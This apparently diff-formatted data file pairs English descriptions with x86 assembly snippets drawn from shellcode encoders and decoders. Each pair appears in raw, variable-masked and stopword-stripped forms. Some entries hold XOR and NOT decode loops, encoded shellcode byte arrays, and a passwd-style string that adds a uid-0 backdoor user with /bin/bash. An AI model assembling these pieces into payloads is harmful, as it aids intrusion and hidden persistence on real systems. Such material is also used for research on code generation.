+perform a xor operation between a byte in esi and cl </s> xor byte [esi] , cl
+perform the xor operation between the byte at memory location esi+ecx and 0x0f </s> xor byte [esi+ecx] , 0x0f
+perform the xor operation between cl and 0x32 and store the resut in cl </s> xor cl , 0x32
+jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero </s> xor cl , 0xAA \n jnz Next_Cycle
+jump to the shift_decode label if the result of the logical xor between the cl register and the value 0xAA is zero </s> xor cl , 0XAA \n jz shift_decode
+jump to the Next_Cycle label if the result of the logical xor between the dl register and the value 0xBB is zero </s> xor dl , 0xBB \n jz Next_Cycle
+clear the eax register </s> xor eax , eax
+clear the eax register and move the next byte of the shellcode into the lower byte of the register </s> xor eax , eax \n mov al , [esi+1]
+clear the eax register and move 2 in the lowest byte of the register </s> xor eax , eax \n mov al , 2
+clear the eax register and push its contents onto the stack </s> xor eax , eax \n push eax
+clear eax and ebx </s> xor eax , eax \n xor ebx , ebx
+zero out eax, ebx and ecx </s> xor eax , eax \n xor ebx , ebx \n xor ecx , ecx
+clear ebp register </s> xor ebp , ebp
+clear ebx </s> xor ebx , ebx
+clear ebx register </s> xor ebx , ebx
+zero out the ebx register and jump to the exit label if the contents of the eax register is not equal to the contents of the ebx register </s> xor ebx , ebx \n cmp eax , ebx \n jne exit
+clear ebx and move 0x4 in the lowest byte of the register </s> xor ebx , ebx \n mov bl , 0x4
+zero out the ebx register and push zero onto the stack </s> xor ebx , ebx \n push ebx
+clean ebx and ecx </s> xor ebx , ebx \n xor ecx , ecx
+perform a logical xor between the ecx register and the bh register and save the result in ecx </s> xor ecx , bh
+clear ecx </s> xor ecx , ecx
+zero out the ecx register and jump to the l1 label if the contents of the ebx register is not equal to the contents of the ecx register </s> xor ecx , ecx \n cmp ebx , ecx \n jne l1
+zero out the ecx register and move the next byte of the shellcode into the lower byte of the register </s> xor ecx , ecx \n mov cl , [esi+1]
+zero out ecx and move 0x3 in the lowest byte of the register </s> xor ecx , ecx \n mov cl , 0x3
+clear the ecx register and move 2 in the lowest byte of the register </s> xor ecx , ecx \n mov cl , 2
+clean the ecx register and move 5 in the lowest byte of the register </s> xor ecx , ecx \n mov cl , 5
+zero out the eax register and the ecx register </s> xor ecx , ecx \n mul ecx
+init edi 0 </s> xor edi , edi
+zero out the edx register and move the next byte of the shellcode into the lower byte of the register </s> xor edx , ecx \n mov dl , [esi+1]
+zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register </s> xor edx , edx \n cmp ecx , edx \n jne l2
+clean the edx register and move 5 in the lowest byte of the register </s> xor edx , edx \n mov dl , 5
+zero out zero_reg </s> xor zero_reg , zero_reg
+define the _egg label </s> var0 :
+define the _file label </s> var0 :
+define the _param label </s> var0 :
+_start function </s> var0 :
+add 0x40 to the al register </s> add al , var0
+add the value 2 to the contents of the al register </s> add al , 2
+add the contents of bx into ax </s> add ax , var0
+add the byte value 2 to the esi register </s> add byte [var0] , 2
+add 30 to the single byte stored at memory address var </s> add byte [var] , 30
+add 3 to ecx and jump to L3 if the sum is not zero </s> add eax , 3 \n jnz var1
+add decimal 48 to eax </s> add var0 , 48
+add the contents of ebx to the contents of eax </s> add var1 , var0
+add 0x2 to the contents in ebx and save the result in ebx </s> add var1 , var0
+add the value 1 into the ecx register </s> add var0 , 1
+add 4 to the contents of the esi register </s> add var0 , 4
+call the _myfunc function </s> call var0
+call the cont function </s> call var0
+call the function decoder </s> call decoder
+call set_argv </s> call var0
+call writestring </s> call var0
+define call_decoder function </s> var0 :
+define call_shellcode label </s> var0 :
+define call_shellcode function </s> var0 :
+define the call_write label </s> var0 :
+define the child function </s> var0 :
+if the contents of the al register is not equal to the contents of the cl register then jump short to the decode label else jump to the shellcode label </s> cmp al , cl \n jne short decode \n jmp shellcode
+jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register </s> cmp ax , var1 \n jne var0
+if the contents of the bl register is equal to the value 0xaa then jump to the shellcode label </s> cmp var0 , var1 \n je shellcode
+if the contents of the bl register is equal to the value 0xbb then jump to the xordecode label else jump to the notdecode label </s> cmp var0 , var1 \n je var2 \n jmp var3
+if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7 then jump to the lowbound label </s> cmp BYTE [var0] , var1 \n jle var2
+if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD then jump to the wrap_around label </s> cmp byte [var0] , 0xD \n jle var1
+jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register </s> cmp BYTE var2 , [var1] \n jne var0
+if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270 then jump to the while label </s> cmp DWORD [var0] , var1 \n je while
+define cycle label </s> cycle :
+in D1 move the current byte of the shellcode in the bl register </s> var0 : \n mov var1 , byte [esi]
+declare the function D2 and negate the byte in esi </s> var0 : \n not byte [var1]
+declare the ruotine D3 and add the value 8 to the current byte of the shellcode </s> var1 : \n add byte [esi] , 8
+define function D3 and subtract 7 from the current byte of the shellcode </s> var1 : \n sub byte [esi] , 7
+in D4 store the shellcode in edi and move the pointer into esi </s> var0 : \n pop var2 \n mov var1 , var2
+define the function D4 and perform the xor operation between the byte in esi and the 0x5 value </s> var0 : \n xor byte [var1] , var2
+decrement the bl register and jump to L1 if the result is zero </s> dec var0 \n jz var1
+decrement the contents of the cl register and jump to the loop_dup label if the result is not negative </s> dec cl \n jns var0
+decrement dl and jump to L3 if the result is not zero </s> dec dl \n jnz var0
+decrement dl and jump to L3 if the result is zero </s> dec dl \n jz var0
+decrement ebx </s> dec var0
+decrease ecx by 1 </s> dec var0
+decrement esp </s> dec esp
+define decode_pr label </s> var0 :
+define decode function </s> var0 :
+declare the decode label </s> decode :
+define decoded_shellcode function </s> var0 :
+define decoder label </s> decoder :
+declare the decrypt label </s> decrypt :
+divide eax by ecx </s> div var1
+declare the enc label </s> var0 :
+define the array of bytes encodedshellcode and initialize it to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce </s> var0 : db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce
+define the array of bytes encodedshellcode and initialize it to 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3 </s> var0 : db 0x4e , 0xc1 , 0x51 , 0x2f , 0x58 , 0x3c , 0xdb , 0xac , 0xef , 0x82 , 0xef , 0x1c , 0x2a , 0xd9 , 0xdb , 0x90 , 0xdb , 0x6b , 0xef , 0x61 , 0x3b , 0x1c , 0xcb , 0x24 , 0xfb , 0xd6 , 0xc5 , 0x50 , 0x23 , 0xfa , 0x58 , 0x9c , 0xc5 , 0xb1 , 0x33 , 0x97 , 0x28 , 0x31 , 0xc5 , 0xaa , 0x43 , 0xf9 , 0x56 , 0xf4 , 0xad , 0xc2 , 0x02 , 0x16 , 0x55 , 0xe3
+declare the encrypt label </s> encrypt :
+define execfile function </s> var0 :
+declare the execute label </s> execute :
+define F1 and call the function function_1 </s> var0 : \n call var1
+in the function F1 jump to label L1 if the current byte of the shellcode is lower than 0x1 else subtract 0x1 from the byte of the shellcode and jump to L2 </s> var0 : \n cmp byte [esi] , var3 \n jl var1 \n sub byte [esi] , var3 \n jmp var6
+in the function F1 point to the next byte in esi </s> var0 : \n inc var1
+in the function F1 point to the next word in esi </s> var0 : \n inc var1 \n inc var1
+define F1 function and jump short to L1 </s> var0 : \n jmp short var1
+in the function F1 negate cl and increment cl to the next byte </s> var0 : \n not cl \n inc cl
+define F1, negate cl and increment cl to the next byte </s> var0 : \n not cl \n inc cl
+define F1, negate cl and point to the next byte in the cl register </s> var0 : \n not cl \n inc cl
+define the function F1 and store the encoded shellcode pointer in the esi register </s> var0 : \n pop var1
+declare the function F1 and save in esi the pointer to the shellcode </s> var0 : \n pop var1
+declare the function F1 and point the shellcode in esi </s> var0 : \n pop var1
+in the function F1 point to the next byte of the edi and jump short to L1 </s> var0 : inc var1 \n jmp short var2
+define format label </s> format :
+define formatting label </s> formatting :
+declare the four label </s> four :
+declare the get label </s> get :
+declare global _start </s> global var0
+increment the contents of the dx register </s> inc var0
+increment the address in eax by one byte </s> inc var0
+increment eax </s> inc var0
+point to the next word in the eax register </s> inc var0 \n inc var0
+move to the next word in eax </s> inc var0 \n inc var0
+next instruction in the ecx register </s> inc var0
+point to the next word in the ecx </s> inc var0 \n inc var0
+increment the contents of the edi register </s> inc var0
+increment edx </s> inc var0
+point to the next byte in the edx register </s> inc var0
+move to the next double word in the edx register </s> inc var0 \n inc var0 \n inc var0 \n inc var0
+increment esi </s> inc var0
+point to the next byte of the encoded shellcode </s> inc esi
+increment to the next byte of the shellcode </s> inc esi
+point to the next word of the shellcode </s> inc esi \n inc esi
+move to the next byte in the shellcode and jump to L2 </s> inc esi \n jmp var0
+point to the next byte of the shellcode and jump short to L1 </s> inc esi \n jmp short var0
+declare inc_dec function </s> var0 :
+jump to the data label </s> jmp data
+jump short to the call_decoder label </s> jmp short var0
+jump short to the function call_shellcode </s> jmp short var0
+jump short to the call_write label </s> jmp short var0
+jump short to the enc label </s> jmp short var0
+jump short to the get label </s> jmp short get
+jump short to the main label </s> jmp short main
+jump short to the output label </s> jmp short output
+jump short to the shellcode label </s> jmp short shellcode
+jump short to the three label </s> jmp short three
+jump to two </s> jmp two
+jump to 0x86 if the carry flag is zero </s> jnc var0
+if zero jump to the encoded label </s> jz encoded
+declare L4 and jump to the shellcode </s> var0 : \n call [esp]
+place the value ebx+4*esi in edi </s> lea var1 , [var0]
+load the effective address of the result of the operation [esi + 13] into the edi register </s> lea edi , [esi+13]
+load the effective address [esi] into edi </s> lea edi , [esi]
+point edi to the next byte of the shellcode </s> lea var0 , [esi+1]
+load the effective address [esi+4] into esi </s> lea esi , [esi+4]
+decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero </s> loop decode
+decrement the count register and jump to decode if not equal zero </s> loop decode
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register </s> loop decode \n jmp var2
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label </s> loop decode \n jmp var2
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label </s> loop decode \n jmp var2
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label </s> loop decode \n jmp short shellcode
+decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero </s> loop decrypt
+decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register </s> loop var2 \n jmp var3
+declare the main_inc label </s> var0 :
+declare the main label </s> main :
+move the contents of the al register into the edi register </s> mov [var0] , al
+move the contents of the al register into the esi register </s> mov [var0] , al
+move al into the address [esi+13] </s> mov [esi+13] , al
+move the byte at the address [esi] into al </s> mov al , byte [esi]
+move the byte in esi into the al register </s> mov al , byte [var0]
+move the byte at the memory location specified by the operation [esi+1+ebp] into al </s> mov al , byte [esi+1+ebp]
+move a byte from the address esi+ecx into al </s> mov al , byte [var0]
+move cl into al </s> mov al , cl
+move dl into al </s> mov al , dl
+move exit_call into al </s> mov al , var0
+move the contents at the address pointed by esi into the ax register </s> mov ax , [var0]
+move the memory offset table+esi*4 into ax </s> mov ax , table[esi*4]
+move 0x12 into bh </s> mov bh , var0
+move 0xe2 into bh </s> mov bh , var0
+move the contents of memory address esi+ecx into bl </s> mov var1 , [var0]
+move 0bh into bl </s> mov var1 , var0
+move 0xff into bl </s> mov var1 , var0
+move 1 into bl </s> mov var0 , 1
+move the byte at the address [eax] into bl </s> mov bl , byte [eax]
+move the byte in edi into bl </s> mov var1 , byte [var0]
+move the byte at the address [edi] into bl </s> mov bl , byte [edi]
+move the byte starting at the address [esi + eax + 1] into the bl register </s> mov bl , byte [esi+eax+1]
+move the byte in esi into bl </s> mov var1 , byte [var0]
+move the byte at the address [esi] into bl </s> mov bl , byte [esi]
+move the byte at the address [esi+ecx+1] into bl </s> mov bl , byte [esi+ecx+1]
+move the byte in esi+ecx+1 into bl </s> mov var1 , byte [var0]
+move the byte 0eh into bl </s> mov var1 , byte var0
+move dl into bl </s> mov var0 , dl
+move dl into the byte in eax </s> mov byte [var0] , dl
+move al into the byte at address [ebx + 35] </s> mov byte [ebx+35] , al
+move the the contents of the bl register into the byte starting at the address in edi </s> mov byte [var1] , var0
+move bl into the byte at address [edx + eax] </s> mov byte [edx+eax] , bl
+move bl into byte edx+eax </s> mov byte [var1] , var0
+move the contents of dl into the byte at the memory location specified by the operation [esi+1] </s> mov byte [esi+1] , dl
+move al into the byte in esi </s> mov byte [var0] , al
+move al into the byte at address [esi+10] </s> mov byte [esi+10] , al
+move bl into the byte at address [esi+ecx] </s> mov byte [esi+ecx] , bl
+move bl into the single byte at the address stored in esi+ecx </s> mov byte [var1] , var0
+move 0x0a into the byte at address [esp] </s> mov byte [esp] , 0x0a
+move 0x2e into the byte at address [esp] </s> mov byte [esp] , 0x2e
+move 0x4 into ch </s> mov var1 , var0
+move 0102 into cl </s> mov cl , 0102
+move 0x3 into cl </s> mov cl , var0
+move al into cl </s> mov cl , al
+move the byte in eax into cl </s> mov cl , byte [var0]
+move the byte at the address [esi] into cl </s> mov cl , byte [esi]
+move the 3rd element of the array byte_table into cl </s> mov cl , var0[2]
+move len into cl </s> mov cl , var0
+move 0x35 into dh </s> mov var1 , var0
+move 0xff into dh </s> mov var1 , var0
+move 0x01 into dl </s> mov dl , var0
+move 0x20 into dl </s> mov dl , var0
+move 0xff into dl </s> mov dl , var0
+move the byte at the memory location specified by the operation [eax+1] into dl </s> mov dl , byte [eax+1]
+move the singl byte at the memory location specified by the operation [esi+1] into dl </s> mov dl , byte [esi+1]
+move the single byte in esi into dl </s> mov dl , byte [var0]
+move the byte 0ffh into dl </s> mov dl , byte var0
+backup ebx into eax </s> mov var1 , var0
+move edi into eax </s> mov var1 , var0
+move esp into ebp </s> mov var0 , esp
+move the contents of memory address ebx+esi into ebx </s> mov ebx , [var0]
+move 0x2 into ebx </s> mov var1 , var0
+move ebp into ecx </s> mov var1 , var0
+move esp into ecx </s> mov var0 , esp
+move the contents of the esp register into the ecx register </s> mov var0 , esp
+move 0x3734b117 into edi </s> mov var1 , var0
+move 0x978cd0d0 into edi </s> mov var1 , var0
+move ecx to edi </s> mov var1 , var0
+move esi into edi </s> mov var1 , var0
+move decimal 78 into edx </s> mov var0 , 78
+move address of stack pointer into edx </s> mov var0 , esp
+move hexlen into edx </s> mov var1 , var0
+move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx </s> mov word [var1] , 2
+multiply eax by ecx </s> mul var1
+define next_cycle label </s> var0 :
+do nothing </s> nop
+perform a bit-wise inversion of the byte starting at the address in esi </s> not byte [var1]
+negate all the bits of the word at the address ax </s> not word ax
+declare odd_numer function </s> odd_number :
+pop the last element pushed onto the stack into cx </s> pop cx
+pop the value on the stack back into edx </s> pop var0
+restore esi from the stack </s> pop var0
+restore the top of the stack into esi register </s> pop var0
+restore the top of the stack into the esi register </s> pop var0
+pop the top of the stack into the esi register </s> pop var0
+pop the value on the stack back into esi </s> pop var0
+get the address of shellcode </s> pop esi
+load address of the encoded shellcode into esi </s> pop var0
+pop the shellcode into esi </s> pop var0
+shellcode address in esi </s> pop var0
+shellcode on esi </s> pop var0
+store the shellcode in the esi register and copy it into ax </s> pop var0 \n mov ax , [var0]
+save the encoded shellcode in esi and move it into bx </s> pop var0 \n mov var1 , [var0]
+point esi to the shellcode and save it into cx </s> pop var0 \n mov cx , [var0]
+pop doublewords from the stack into the 32 bit registers </s> popad
+push esi to the stack </s> push var0
+push the contents of the esi register onto the stack and point ecx to the stack register </s> push var0 \n mov var1 , esp
+declare retry label </s> retry :
+left rotate the byte in esi 1 time </s> rol byte [var0] , 0x1
+left rotate the edx register 4 times </s> rol var0 , 0x4
+right rotate the byte in esi 1 time </s> ror byte [var0] , 0x1
+right rotate esi 1 time </s> ror var0 , 1
+declare the shell label </s> shell :
+define shellcode label </s> shellcode :
+define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash </s> shellcode : db "vl43ck : $6$bxwJfzor$var2 . var3 . var4 : 0 : 0 : vl43ck : /tmp : /var7"
+define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23 </s> shellcode : db 0x4b , 0xf7 , 0x13 , 0x59 , 0xcc , 0x8c , 0x63 , 0x5e , 0x9f , 0x8d , 0x99 , 0x9f , 0x1f , 0xa4 , 0x3b , 0x6e , 0xc6 , 0x36 , 0x23
+define shellcodelen equal to the length of shellcode </s> var0 equ $-shellcode
+define shift_decode label </s> var0 :
+multiply the value of eax by 2 </s> shl var0 , 1
+left shift the contents of eax register by 28 bit positions </s> shl var0 , 28
+left shift the contents of ebx by 8 bits </s> shl var0 , 8
+multiply edx by 4 using left shift </s> shl var0 , 2
+right shift ax by 1 bit </s> shr ax , 1
+right shift the contents of the edi register by the contents of the cl register </s> shr ax , cl
+right shift the contents of bl register by 4 bit positions </s> shr var0 , 4
+right shift the contents of dl register by 1 bit positions </s> shr dl , 1
+right shift the contents of dl register by 4 bit positions </s> shr dl , 4
+shift right dx by the contents of bl and negate the byte in dx </s> shr var0 , var2 \n not byte var0
+right shift the contents of the eax register by 24 bit positions </s> shr var0 , 24
+right shift the contents of eax register by 28 bit positions </s> shr var0 , 28
+right shift the contents of the ebx register by the contents of the cl register </s> shr var0 , cl
+define stage label </s> stage :
+declare the stageaddress label </s> var0 :
+subtract 13 from ax and save the result into ax </s> sub ax , 13
+subtract 1564 from the contents of the ax register </s> sub ax , 1564
+subtract the contents of al register from the contents of bl register and save the result in bl </s> sub var0 , al
+subtract 0x7 from the byte in esi register </s> sub bl , byte [var1]
+subtract the value 3 from the byte in esi and negate it </s> sub byte [var0] , 3 \n not byte [var0]
+subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero </s> sub cl , 1 \n jnz decode
+subtract the contents of dl register from the contents of cl register and save the result in cl </s> sub cl , dl
+subtract the contents of cx from the contents of cx </s> sub cx , cx
+subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative </s> sub dl , al \n jns var0
+subtract the contents of bx from the contents of dx </s> sub var1 , var0
+subtract 0x10 from eax </s> sub var1 , var0
+allocate memory for variable </s> sub esp , 4
+subtract the byte value 0x1 from esp register and save the result in esp </s> sub esp , byte var0
+if the contents of the eax register is zero then jump to the label socket </s> test var0 , var0 \n jz socket
+jump short to the label l1 if the contents of the ebx register is negative </s> test var1 , var1 \n js short var0
+test the contents of the edx register </s> test var0 , var0
+swap the contents in ebp+16 and ecx </s> xchg [var0] , var1
+perform the xor operation between the al register and the value 0x4a </s> xor al , var0
+perform a xor operation between ax and 0x539 and save the result in ax </s> xor ax , var0
+perform a logical xor between the bx register and the ax register and save the result in ax </s> xor ax , var0
+jump to the call_decoded label if the result of the logical xor between the ax register and the bx register is zero </s> xor ax , var1 \n jz var0
+jump to the encoded label if the result of the logical xor between the bl register and the value 0xBB is zero </s> xor var0 , var1 \n jz encoded
+jump to the formatting label if the result of the logical xor between the bl register and the value 0xBB is zero </s> xor var0 , var1 \n jz formatting
+initialize bx to 0 </s> xor var0 , var0
+clear the bx register </s> xor var0 , var0
+perform the xor operation between the byte starting at the addess in esi and the value 0x2c </s> xor byte [var0] , var1
+perform a xor operation between a byte in esi and cl </s> xor byte [var0] , cl
+perform the xor operation between the byte at memory location esi+ecx and 0x0f </s> xor byte [var0] , var1
+perform the xor operation between cl and 0x32 and store the resut in cl </s> xor cl , var0
+jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero </s> xor cl , var1 \n jnz var0
+jump to the shift_decode label if the result of the logical xor between the cl register and the value 0xAA is zero </s> xor cl , 0XAA \n jz var0
+jump to the Next_Cycle label if the result of the logical xor between the dl register and the value 0xBB is zero </s> xor dl , var1 \n jz var0
+clear the eax register </s> xor var0 , var0
+clear the eax register and move the next byte of the shellcode into the lower byte of the register </s> xor var0 , var0 \n mov al , [esi+1]
+clear the eax register and move 2 in the lowest byte of the register </s> xor var0 , var0 \n mov al , 2
+clear the eax register and push its contents onto the stack </s> xor var0 , var0 \n push var0
+clear eax and ebx </s> xor var0 , var0 \n xor var1 , var1
+zero out eax, ebx and ecx </s> xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2
+clear ebp register </s> xor var0 , var0
+clear ebx </s> xor var0 , var0
+clear ebx register </s> xor var0 , var0
+zero out the ebx register and jump to the exit label if the contents of the eax register is not equal to the contents of the ebx register </s> xor var0 , var0 \n cmp var2 , var0 \n jne exit
+clear ebx and move 0x4 in the lowest byte of the register </s> xor var0 , var0 \n mov bl , var1
+zero out the ebx register and push zero onto the stack </s> xor var0 , var0 \n push var0
+clean ebx and ecx </s> xor var0 , var0 \n xor var1 , var1
+perform a logical xor between the ecx register and the bh register and save the result in ecx </s> xor var0 , bh
+clear ecx </s> xor var0 , var0
+zero out the ecx register and jump to the l1 label if the contents of the ebx register is not equal to the contents of the ecx register </s> xor var0 , var0 \n cmp var3 , var0 \n jne var2
+zero out the ecx register and move the next byte of the shellcode into the lower byte of the register </s> xor var0 , var0 \n mov cl , [esi+1]
+zero out ecx and move 0x3 in the lowest byte of the register </s> xor var0 , var0 \n mov cl , var1
+clear the ecx register and move 2 in the lowest byte of the register </s> xor var0 , var0 \n mov cl , 2
+clean the ecx register and move 5 in the lowest byte of the register </s> xor var0 , var0 \n mov cl , 5
+zero out the eax register and the ecx register </s> xor var1 , var1 \n mul var1
+init edi 0 </s> xor var1 , var1
+zero out the edx register and move the next byte of the shellcode into the lower byte of the register </s> xor var0 , ecx \n mov dl , [esi+1]
+zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register </s> xor var0 , var0 \n cmp var3 , var0 \n jne var2
+clean the edx register and move 5 in the lowest byte of the register </s> xor var0 , var0 \n mov dl , 5
+zero out zero_reg </s> xor var0 , var0
+define var0 label </s> var0 :
+define var0 label </s> var0 :
+define var0 label </s> var0 :
+var0 function </s> var0 :
+add var0 al register </s> add al , var0
+add value 2 contents al register </s> add al , 2
+add contents var0 ax </s> add ax , var0
+add byte value 2 var0 register </s> add byte [var0] , 2
+add 30 single byte stored memory address var </s> add byte [var] , 30
+add 3 var0 and jump var1 if sum not zero </s> add eax , 3 \n jnz var1
+add decimal 48 var0 </s> add var0 , 48
+add contents var0 contents var1 </s> add var1 , var0
+add var0 contents var1 and save result var1 </s> add var1 , var0
+add value 1 var0 register </s> add var0 , 1
+add 4 contents var0 register </s> add var0 , 4
+call var0 function </s> call var0
+call var0 function </s> call var0
+call function decoder </s> call decoder
+call var0 </s> call var0
+call var0 </s> call var0
+define var0 function </s> var0 :
+define var0 label </s> var0 :
+define var0 function </s> var0 :
+define var0 label </s> var0 :
+define var0 function </s> var0 :
+if contents al register not equal contents cl register then jump short decode label else jump shellcode label </s> cmp al , cl \n jne short decode \n jmp shellcode
+jump var0 label if contents ax register not equal contents var1 register </s> cmp ax , var1 \n jne var0
+if contents var0 register equal value var1 then jump shellcode label </s> cmp var0 , var1 \n je shellcode
+if contents var0 register equal value var1 then jump var2 label else jump var3 label </s> cmp var0 , var1 \n je var2 \n jmp var3
+if byte starting address contained var0 register lower or equal byte value var1 then jump var2 label </s> cmp BYTE [var0] , var1 \n jle var2
+if byte starting address contained var0 register lower or equal byte value 0xD then jump var1 label </s> cmp byte [var0] , 0xD \n jle var1
+jump label var0 if first byte var1 register not equal contents var2 register </s> cmp BYTE var2 , [var1] \n jne var0
+if doubleword starting address contained var0 register equal doubleword value var1 then jump while label </s> cmp DWORD [var0] , var1 \n je while
+define cycle label </s> cycle :
+in var0 move current byte shellcode var1 register </s> var0 : \n mov var1 , byte [esi]
+declare function var0 and negate byte var1 </s> var0 : \n not byte [var1]
+declare var0 var1 and add value 8 current byte shellcode </s> var1 : \n add byte [esi] , 8
+var0 function var1 and subtract 7 current byte shellcode </s> var1 : \n sub byte [esi] , 7
+in var0 store shellcode var1 and move pointer var2 </s> var0 : \n pop var2 \n mov var1 , var2
+define function var0 and perform xor operation byte var1 and var2 value </s> var0 : \n xor byte [var1] , var2
+decrement var0 register and jump var1 if result zero </s> dec var0 \n jz var1
+decrement contents cl register and jump var0 label if result not negative </s> dec cl \n jns var0
+decrement dl and jump var0 if result not zero </s> dec dl \n jnz var0
+decrement dl and jump var0 if result zero </s> dec dl \n jz var0
+decrement var0 </s> dec var0
+decrease var0 1 </s> dec var0
+decrement esp </s> dec esp
+define var0 label </s> var0 :
+define var0 function </s> var0 :
+declare decode label </s> decode :
+define var0 function </s> var0 :
+define decoder label </s> decoder :
+declare decrypt label </s> decrypt :
+divide var0 var1 </s> div var1
+declare var0 label </s> var0 :
+define array bytes var0 and initialize it var1 </s> var0 : db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce
+define array bytes var0 and initialize it var1 </s> var0 : db 0x4e , 0xc1 , 0x51 , 0x2f , 0x58 , 0x3c , 0xdb , 0xac , 0xef , 0x82 , 0xef , 0x1c , 0x2a , 0xd9 , 0xdb , 0x90 , 0xdb , 0x6b , 0xef , 0x61 , 0x3b , 0x1c , 0xcb , 0x24 , 0xfb , 0xd6 , 0xc5 , 0x50 , 0x23 , 0xfa , 0x58 , 0x9c , 0xc5 , 0xb1 , 0x33 , 0x97 , 0x28 , 0x31 , 0xc5 , 0xaa , 0x43 , 0xf9 , 0x56 , 0xf4 , 0xad , 0xc2 , 0x02 , 0x16 , 0x55 , 0xe3
+declare encrypt label </s> encrypt :
+define var0 function </s> var0 :
+declare execute label </s> execute :
+define var0 and call function var1 </s> var0 : \n call var1
+in function var0 jump label var1 if current byte shellcode lower var3 else subtract var3 byte shellcode and jump var6 </s> var0 : \n cmp byte [esi] , var3 \n jl var1 \n sub byte [esi] , var3 \n jmp var6
+in function var0 point next byte var1 </s> var0 : \n inc var1
+in function var0 point next word var1 </s> var0 : \n inc var1 \n inc var1
+define var0 function and jump short var1 </s> var0 : \n jmp short var1
+in function var0 negate cl and increment cl next byte </s> var0 : \n not cl \n inc cl
+define var0 negate cl and increment cl next byte </s> var0 : \n not cl \n inc cl
+define var0 negate cl and point next byte cl register </s> var0 : \n not cl \n inc cl
+define function var0 and store encoded shellcode pointer var1 register </s> var0 : \n pop var1
+declare function var0 and save var1 pointer shellcode </s> var0 : \n pop var1
+declare function var0 and point shellcode var1 </s> var0 : \n pop var1
+in function var0 point next byte var1 and jump short var2 </s> var0 : inc var1 \n jmp short var2
+define format label </s> format :
+define formatting label </s> formatting :
+declare four label </s> four :
+declare get label </s> get :
+declare global var0 </s> global var0
+increment contents var0 register </s> inc var0
+increment address var0 one byte </s> inc var0
+increment var0 </s> inc var0
+point next word var0 register </s> inc var0 \n inc var0
+move next word var0 </s> inc var0 \n inc var0
+next instruction var0 register </s> inc var0
+point next word var0 </s> inc var0 \n inc var0
+increment contents var0 register </s> inc var0
+increment var0 </s> inc var0
+point next byte var0 register </s> inc var0
+move next double word var0 register </s> inc var0 \n inc var0 \n inc var0 \n inc var0
+increment var0 </s> inc var0
+point next byte encoded shellcode </s> inc esi
+increment next byte shellcode </s> inc esi
+point next word shellcode </s> inc esi \n inc esi
+move next byte shellcode and jump var0 </s> inc esi \n jmp var0
+point next byte shellcode and jump short var0 </s> inc esi \n jmp short var0
+declare var0 function </s> var0 :
+jump data label </s> jmp data
+jump short var0 label </s> jmp short var0
+jump short function var0 </s> jmp short var0
+jump short var0 label </s> jmp short var0
+jump short var0 label </s> jmp short var0
+jump short get label </s> jmp short get
+jump short main label </s> jmp short main
+jump short output label </s> jmp short output
+jump short shellcode label </s> jmp short shellcode
+jump short three label </s> jmp short three
+jump two </s> jmp two
+jump var0 if carry flag zero </s> jnc var0
+if zero jump encoded label </s> jz encoded
+declare var0 and jump shellcode </s> var0 : \n call [esp]
+place value var0 var1 </s> lea var1 , [var0]
+load the effective address of the result of the operation [esi + 13] into the edi register </s> lea edi , [esi+13]
+load the effective address [esi] into edi </s> lea edi , [esi]
+point var0 next byte shellcode </s> lea var0 , [esi+1]
+load the effective address [esi+4] into esi </s> lea esi , [esi+4]
+decrement var0 and jumps decode label var2 var3 var0 caused its value become zero </s> loop decode
+decrement count register and jump decode if not equal zero </s> loop decode
+decrement var0 register and jump decode label if contents var0 register not zero else jump var2 register </s> loop decode \n jmp var2
+decrement var0 register and jump decode label if contents var0 register not zero else jump var2 label </s> loop decode \n jmp var2
